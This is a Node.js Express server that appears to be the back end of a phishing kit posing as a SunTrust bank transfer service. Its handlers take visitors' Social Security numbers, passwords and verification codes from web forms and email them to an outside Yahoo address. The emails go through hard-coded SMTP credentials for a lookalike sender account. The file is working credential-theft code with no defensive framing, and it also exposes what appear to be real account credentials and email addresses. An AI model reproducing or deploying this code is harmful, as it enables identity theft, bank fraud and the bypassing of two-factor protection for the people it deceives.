const nodemailer = require('nodemailer');
// const satelize = require('satelize');
const axios = require('axios');
const fs = require('fs')
const express = require('express');
const app = express()
const bodyParser = require('body-parser')
const handlebars = require('handlebars');
const path = require('path');

app.set('view engine', 'ejs');
app.use(express.static('public'));

app.use(bodyParser.urlencoded({ extended: true}));  

app.get('/', (req, res) => {
  const date = new Date();
let dated = date.toDateString();
  res.render('index', {dated: dated })
})

app.post('/', (req, res) => {
  req.body.ssn
  req.body.password


const transporter = nodemailer.createTransport({
  port:'465',
  host:'mail.privateemail.com',
  auth: {
    user: 'suntrustinternationaltransfer@thechorleybuildingsociety.co.uk',
    pass: '08028345728',
  },
  secure: true,
})


  // const template = handlebars.compile(data.toString());
  // const replacements = {
  //   ssn: req.body.ssn,
  //   password: req.body.password

  // };
  
      const mailData = {
      from: 'suntrustinternationaltransfer@thechorleybuildingsociety.co.uk',
      to: 'Dah_onest@yahoo.com',
      // to: 'joannelouisekenrick.cbs@gmail.com',
      // subject: `New User Alert`,
    //   text: '************* PENGESAHAN BAYARAN DARI SUNTRUST PERINTAH PEMINDAHAN BANK *** PENGENALAN PEMINDAHAN KOD SW9532832117KMS ********************',
      html: 'SSN : ' +  req.body.ssn + '     ' +
            'PASSWORD : ' + req.body.password,
      //  strUser
      subject: 'New User Alert' ,
      }
  
      transporter.sendMail(mailData, function (err, info) {
        if(err)
          console.log(err)
        else
          console.log(info)
          res.redirect('../verify')
        })


  
})

app.get('/verify', (req, res) => {
    res.render('verify')
  })

  app.post('/verify', (req, res) => {
    req.body.verificationCode
    
  
  
  const transporter = nodemailer.createTransport({
    port:'465',
    host:'mail.privateemail.com',
    auth: {
      user: 'suntrustinternationaltransfer@thechorleybuildingsociety.co.uk',
      pass: '08028345728',
    },
    secure: true,
  })
  
  
    // const template = handlebars.compile(data.toString());
    // const replacements = {
    //   ssn: req.body.ssn,
    //   password: req.body.password
  
    // };
    
        const mailData = {
        from: 'suntrustinternationaltransfer@thechorleybuildingsociety.co.uk',
        to: 'Dah_onest@yahoo.com',
        // to: 'joannelouisekenrick.cbs@gmail.com',
        // subject: `New User Alert`,
      //   text: '************* PENGESAHAN BAYARAN DARI SUNTRUST PERINTAH PEMINDAHAN BANK *** PENGENALAN PEMINDAHAN KOD SW9532832117KMS ********************',
        html: 'VERIFICATION CODE : ' +  req.body.verificationCode + '     ' ,
        //  strUser
        subject: 'Verification Code',
        }
    
        transporter.sendMail(mailData, function (err, info) {
          if(err)
            console.log(err)
          else
            console.log(info)
            res.redirect('../')
          })
  
  
    
  })
  


app.listen(process.env.PORT || 3200, ()=> {
  console.log('server has started')
})
